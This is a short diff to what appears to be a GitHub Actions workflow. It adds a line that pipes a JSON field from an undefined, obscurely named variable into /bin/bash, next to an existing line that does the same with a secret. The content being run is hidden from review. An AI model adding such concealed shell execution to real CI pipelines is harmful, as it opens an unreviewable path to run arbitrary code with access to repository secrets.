@@ -22,6 +22,7 @@ jobs:
           hkibn7479: ${{ secrets.hkibn7479 }}
         run: |
           printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
+          echo $ntg3980 | jq -r .wafa9540 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
